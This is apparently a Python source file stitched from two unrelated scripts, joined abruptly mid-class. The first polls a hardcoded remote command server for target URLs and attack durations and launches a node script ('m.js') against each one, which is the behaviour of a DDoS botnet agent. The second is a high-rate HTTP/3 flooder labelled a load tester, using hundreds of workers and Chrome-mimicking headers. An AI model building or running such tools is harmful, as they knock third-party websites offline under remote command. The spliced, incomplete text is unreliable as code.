import requests
import json
import time
import subprocess
import threading
import os
import sys
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('monitor.log'),
        logging.StreamHandler()
    ]
)

class EndpointMonitor:
    def __init__(self, base_url, username, check_interval=5):
        """
        Initialize the monitor
        
        Args:
            base_url: Base URL of the server (e.g., http://127.0.0.1:3001)
            username: Username to monitor (e.g., 'john')
            check_interval: How often to check for new items (seconds)
        """
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.check_interval = check_interval
        self.endpoint_url = f"{self.base_url}/{self.username}"
        self.removal_url = f"{self.base_url}/{self.username}/done"
        self.processed_items = set()  # Track processed items to avoid duplicates
        self.running = True
        self.active_processes = []  # Track active subprocesses
        
    def fetch_active_items(self):
        """Fetch active items from the endpoint"""
        try:
            response = requests.get(self.endpoint_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    connections = data.get('connections', [])
                    return connections
                else:
                    logging.error(f"API returned error: {data.get('message', 'Unknown error')}")
                    return []
            else:
                logging.error(f"HTTP {response.status_code}: {response.text}")
                return []
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return []
    
    def extract_item_key(self, item):
        """Create a unique key for each item"""
        if 'url' in item:
            # New format: url, time, method
            return f"{item.get('url')}_{item.get('time')}_{item.get('method')}"
        else:
            # Legacy format: ip, port, time
            return f"{item.get('ip')}_{item.get('port')}_{item.get('time')}"
    
    def execute_method_1(self, url, time_param, item_key):
        """Execute command for method 1"""
        # Convert time to integer if possible
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60  # Default to 60 seconds if conversion fails
            
        command = [
            "node", "m.js", url, str(time_int), "1", "1", "1"
        ]
        
        logging.info(f"Method 1 - Executing: {' '.join(command)}")
        
        try:
            # Run the command
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Store process reference
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 1
            })
            
            # Start a thread to read output
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 1 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            # Schedule removal after 4 seconds
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 1 command: {e}")
            return None
    
    def execute_method_2(self, url, time_param, item_key):
        """Execute command for method 2"""
        # Convert time to integer if possible
        try:
            time_int = int(time_param)
        except ValueError:
            time_int = 60  # Default to 60 seconds if conversion fails
            
        command = [
            "node", "m.js", url, str(time_int), "4", "h1"
        ]
        
        logging.info(f"Method 2 - Executing: {' '.join(command)}")
        
        try:
            # Run the command
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Store process reference
            self.active_processes.append({
                'process': process,
                'item_key': item_key,
                'start_time': datetime.now(),
                'url': url,
                'method': 2
            })
            
            # Start a thread to read output
            def read_output(proc, key):
                for line in proc.stdout:
                    logging.info(f"[Method 2 - {key}] {line.strip()}")
                proc.wait()
                
            output_thread = threading.Thread(
                target=read_output,
                args=(process, item_key)
            )
            output_thread.daemon = True
            output_thread.start()
            
            # Schedule removal after 4 seconds
            threading.Timer(4.0, self.remove_item, args=(url, time_param, item_key)).start()
            
            return process
            
        except Exception as e:
            logging.error(f"Failed to execute method 2 command: {e}")
            return None
    
    def remove_item(self, url, time_param, item_key):
        """Remove item from the server after execution"""
        try:
            # For new format (url, time, method)
            removal_params = {
                'url': url,
                'time': time_param
            }
            
            response = requests.get(f"{self.base_url}/{self.username}/visitors", params=removal_params)
            
            if response.status_code == 200:
                logging.info(f"Removed item: {item_key}")
            else:
                logging.warning(f"Failed to remove item {item_key}: HTTP {response.status_code}")
                
        except Exception as e:
            logging.error(f"Error removing item {item_key}: {e}")
    
    def cleanup_old_processes(self):
        """Clean up completed processes from tracking list"""
        current_time = datetime.now()
        self.active_processes = [
            p for p in self.active_processes 
            if p['process'].poll() is None  # Process is still running
            or (current_time - p['start_time']).total_seconds() < 300  # Or less than 5 minutes old
        ]
    
    def monitor_loop(self):
        """Main monitoring loop"""
        logging.info(f"Starting monitor for {self.endpoint_url}")
        logging.info(f"Check interval: {self.check_interval} seconds")
        
        while self.running:
            try:
                # Clean up old processes
                self.cleanup_old_processes()
                
                # Fetch current active items
                items = self.fetch_active_items()
                
                if items:
                    logging.info(f"Found {len(items)} active item(s)")
                    
                    for item in items:
                        item_key = self.extract_item_key(item)
                        
                        # Skip if already processed
                        if item_key in self.processed_items:
                            continue
                        
                        # Process based on item type
                        if 'url' in item and 'method' in item:
                            # New format: url, time, method
                            url = item['url']
                            time_param = item['time']
                            method = item['method']
                            
                            logging.info(f"New item detected: {url} | Time: {time_param} | Method: {method}")
                            
                            # Mark as processed
                            self.processed_items.add(item_key)
                            
                            # Execute based on method
                            if str(method) == '1':
                                self.execute_method_1(url, time_param, item_key)
                            elif str(method) == '2':
                                self.execute_method_2(url, time_param, item_key)
                            else:
                                logging.warning(f"Unknown method: {method} for item {item_key}")
                        else:
                            # Legacy format: ip, port, time (skip or handle differently)
                            logging.info(f"Legacy item detected: {item}")
                            self.processed_items.add(item_key)
                
                # Wait before next check
                time.sleep(self.check_interval)
                
            except KeyboardInterrupt:
                logging.info("Received keyboard interrupt, shutting down...")
                self.stop()
                break
            except Exception as e:
                logging.error(f"Error in monitor loop: {e}")
                time.sleep(self.check_interval)
    
    def stop(self):
        """Stop the monitor and cleanup"""
        self.running = False
        logging.info("Stopping monitor...")
        
        # Terminate all running processes
        for proc_info in self.active_processes:
            try:
                proc_info['process'].terminate()
                logging.info(f"Terminated process for {proc_info['item_key']}")
            except:
                pass
        
        # Wait a bit for processes to terminate
        time.sleep(2)
        
        # Force kill any remaining processes
        for proc_info in self.active_processes:
            try:
                if proc_info['process'].poll() is None:
                    proc_info['process'].kill()
            except:
                pass

def main():
    """Main function"""
    # Configuration
    BASE_URL = "http://37.114.46.10:3001"
    USERNAME = "team"
    CHECK_INTERVAL = 5  # seconds
    
    # Create monitor instance
    monitor = EndpointMonitor(BASE_URL, USERNAME, CHECK_INTERVAL)
    
    try:
        # Start monitoring
        monitor.monitor_loop()
    except KeyboardInterrupt:
        monitor.stop()
        logging.info("Monitor stopped by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        monitor.stop()
        sys.exit(1)

if __name__ == "__main__":
    # Check if m.js exists
    if not os.path.exists("m.js"):
        logging.warning("Warning: m.js file not found in current directory")
        logging.info("Current directory: " + os.getcwd())
        logging.info("Please ensure m.js is in the same directory as this script")
    
    main()        coros = [create_conn(i) for i in range(self.initial_pool_size)]
        results = await asyncio.gather(*coros)
        self.pool = [p for p in results if p is not None]
        
        if not self.pool:
            raise RuntimeError("Không thể thiết lập bất kỳ kết nối nào!")
        
        print(f"✓ Đã tạo {len(self.pool)}/{self.initial_pool_size} kết nối thành công")

        self._maintainer_task = asyncio.create_task(self._maintainer())
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        self._running = False
        if self._maintainer_task:
            self._maintainer_task.cancel()
        if self._stack:
            await self._stack.__aexit__(exc_type, exc_val, exc_tb)

    async def _maintainer(self):
        while self._running:
            async with self._lock:
                current = len(self.pool)
                if current < self.initial_pool_size:
                    print(f"Pool low: {current}/{self.initial_pool_size}, replenishing...")
                    to_create = self.initial_pool_size - current
                    coros = [self._create_single_conn(current + i) for i in range(to_create)]
                    new = await asyncio.gather(*coros)
                    self.pool.extend([p for p in new if p is not None])
                    print(f"Replenished: now {len(self.pool)} connections")
            await asyncio.sleep(0.5)  # Check every 5 seconds

    async def _create_single_conn(self, i):
        try:
            cm = connect(
                self.host,
                self.port,
                configuration=self.config,
                create_protocol=Http3ClientProtocol,
                wait_connected=True
            )
            protocol = await asyncio.wait_for(
                self._stack.enter_async_context(cm),
                timeout=10.0
            )
            return protocol
        except asyncio.TimeoutError:
            print(f"  Cảnh báo: Kết nối bổ sung {i + 1} timeout, bỏ qua...")
            return None
        except Exception as e:
            print(f"  Cảnh báo: Kết nối bổ sung {i + 1} thất bại: {type(e).__name__}")
            return None

    async def get_connection(self) -> Http3ClientProtocol:
        """Get a random connection from the pool."""
        async with self._lock:
            if not self.pool:
                raise RuntimeError("No connections available in pool")
            return random.choice(self.pool)

    async def remove_connection(self, protocol: Http3ClientProtocol):
        """Remove a bad connection from the pool."""
        async with self._lock:
            if protocol in self.pool:
                self.pool.remove(protocol)
                try:
                    protocol.close()
                except:
                    pass
                print(f"Removed bad connection. Pool size now: {len(self.pool)}")

class AtomicCounter:
    """Thread-safe counter for high-frequency increments."""
    def __init__(self):
        self._value = 0
        self._lock = asyncio.Lock()

    async def increment(self):
        async with self._lock:
            self._value += 1

    async def get_value(self):
        async with self._lock:
            return self._value

async def worker(
    worker_id: int,
    pool: ConnectionPool,
    headers: List[tuple],
    duration: float,
    counter: AtomicCounter,
    stats: dict,
    semaphore: asyncio.Semaphore,
    interval: float
):
    """Worker that sends requests using a connection from the pool with pacing."""
    end_time = time.perf_counter() + duration
    request_count = 0
    error_count = 0
    next_send = time.perf_counter()

    while next_send < end_time:
        async with semaphore:
            try:
                conn = await pool.get_connection()
            except Exception as e:
                print(f"Worker {worker_id} failed to get connection: {type(e).__name__}")
                error_count += 1
                await asyncio.sleep(0.1)  # Brief backoff
                continue

            try:
                start_req = time.perf_counter()
                resp = await conn.send_request(headers, timeout=5.0)
                request_latency = (time.perf_counter() - start_req) * 1000  # ms
                await counter.increment()
                request_count += 1
                if request_count % 10 == 0:
                    stats.setdefault('latencies', []).append(request_latency)
                if resp.headers and any(k == b':status' and v == b'200' for k, v in resp.headers):
                    pass  # success
                else:
                    raise ValueError("Non-200 status")
            except Exception as e:
                error_count += 1
                if error_count % 100 == 1:
                    print(f"Worker {worker_id} error (count={error_count}): {type(e).__name__}")
                # Remove bad connection on error
                await pool.remove_connection(conn)
            finally:
                # Pace to next send time regardless of success/failure
                next_send += interval
                delay = next_send - time.perf_counter()
                if delay > 0:
                    await asyncio.sleep(delay)
                elif delay < -interval * 2:  # If too far behind, reset
                    next_send = time.perf_counter() + interval

    async with stats['_lock']:
        stats['total_requests'] = stats.get('total_requests', 0) + request_count
        stats['total_errors'] = stats.get('total_errors', 0) + error_count
    return request_count, error_count

def build_headers(host: str, path: str) -> List[tuple]:
    """Build HTTP/3 request headers to mimic Chrome."""
    return [
        (b":method", b"GET"),
        (b":scheme", b"https"),
        (b":authority", host.encode()),
        (b":path", path.encode()),
        (b"user-agent", b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
        (b"accept", b"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"),
        (b"sec-ch-ua", b'"Not)A;Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"'),
        (b"sec-ch-ua-mobile", b"?0"),
        (b"sec-ch-ua-platform", b'"Windows"'),
        (b"upgrade-insecure-requests", b"1"),
        (b"accept-encoding", b"gzip, deflate, br, zstd"),
        (b"accept-language", b"en-US,en;q=0.9"),
        (b"sec-fetch-site", b"none"),
        (b"sec-fetch-mode", b"navigate"),
        (b"sec-fetch-user", b"?1"),
        (b"sec-fetch-dest", b"document"),
        (b"priority", b"u=0, i"),
        (b"sec-ch-prefers-color-scheme", b"light"),
        (b"viewport-width", b"1920"),
        (b"cache-control", b"no-cache, no-store, must-revalidate"),
    ]

async def main():
    parser = argparse.ArgumentParser(description="Maximized RPS HTTP/3 Load Tester")
    parser.add_argument("--url", required=True, help="Target URL (HTTPS only)")
    parser.add_argument("--rps", type=int, required=True, help="Target requests per second")
    parser.add_argument("--workers", type=int, default=500, help="Number of worker tasks")
    parser.add_argument("--connections", type=int, default=100, help="QUIC connections in pool")
    parser.add_argument("--duration", type=int, default=30, help="Test duration in seconds")
    parser.add_argument("--max-concurrency", type=int, default=2000, help="Max concurrent requests")
    args = parser.parse_args()

    parsed = urlparse(args.url)
    if parsed.scheme != "https":
        raise SystemExit("Error: Only HTTPS URLs are supported.")

    # Optimized QUIC Configuration
    config = QuicConfiguration(
        is_client=True,
        alpn_protocols=H3_ALPN,
        verify_mode=ssl.CERT_REQUIRED,
        cipher_suites=[
            CipherSuite.AES_128_GCM_SHA256,
            CipherSuite.AES_256_GCM_SHA384,
            CipherSuite.CHACHA20_POLY1305_SHA256,
        ],
        max_data=20 * 1024 * 1024,           # Increased
        max_stream_data=10 * 1024 * 1024,    # Increased
        idle_timeout=30.0,
        congestion_control_algorithm='cubic',
        max_datagram_frame_size=65535,
    )

    print(f"Starting load test for {args.duration}s at {args.rps} RPS target...")
    print(f"Workers: {args.workers}, Connections: {args.connections}")

    async with ConnectionPool(
        host=parsed.hostname,
        port=parsed.port or 443,
        config=config,
        pool_size=args.connections
    ) as pool:
        headers = build_headers(parsed.hostname, parsed.path or "/")
        counter = AtomicCounter()
        stats = {'_lock': asyncio.Lock(), 'total_requests': 0, 'total_errors': 0}

        semaphore = asyncio.Semaphore(args.max_concurrency)

        # Calculate per-worker interval for pacing
        per_worker_rps = args.rps / args.workers if args.workers > 0 else args.rps
        interval = 1.0 / per_worker_rps if per_worker_rps > 0 else 0.0

        start_time = time.perf_counter()
        tasks = [
            asyncio.create_task(
                worker(i, pool, headers, args.duration, counter, stats, semaphore, interval),
                name=f"worker-{i}"
            )
            for i in range(args.workers)
        ]

        async def monitor():
            last_count = 0
            last_time = start_time
            while any(not t.done() for t in tasks):
                await asyncio.sleep(2.0)
                current_count = await counter.get_value()
                current_time = time.perf_counter()
                elapsed = current_time - last_time
                if elapsed > 0:
                    current_rps = (current_count - last_count) / elapsed
                    print(f"Progress: {current_count} req | Current RPS: {current_rps:.1f} | "
                          f"Errors: {stats.get('total_errors', 0)} | Pool size: {len(pool.pool)}")
                last_count = current_count
                last_time = current_time

        monitor_task = asyncio.create_task(monitor())

        results = await asyncio.gather(*tasks, return_exceptions=True)
        monitor_task.cancel()

        total_time = time.perf_counter() - start_time
        total_requests = await counter.get_value()
        avg_rps = total_requests / total_time if total_time > 0 else 0

        print("\n" + "="*60)
        print("LOAD TEST COMPLETE")
        print("="*60)
        print(f"Total runtime:      {total_time:.2f}s")
        print(f"Total requests:     {total_requests}")
        print(f"Average RPS:        {avg_rps:.2f}")
        print(f"Target RPS:         {args.rps}")
        print(f"Effectiveness:      {(avg_rps/args.rps*100):.1f}% of target")
        print(f"Total errors:       {stats.get('total_errors', 0)}")

        if stats.get('latencies'):
            latencies = stats['latencies']
            print(f"Latency stats (ms): Min={min(latencies):.1f}, "
                  f"Avg={sum(latencies)/len(latencies):.1f}, "
                  f"Max={max(latencies):.1f}, P95={sorted(latencies)[int(len(latencies)*0.95)]:.1f}")

        successful_workers = sum(1 for r in results if not isinstance(r, Exception))
        print(f"Workers completed:  {successful_workers}/{args.workers}")

if __name__ == "__main__":
    asyncio.run(main())
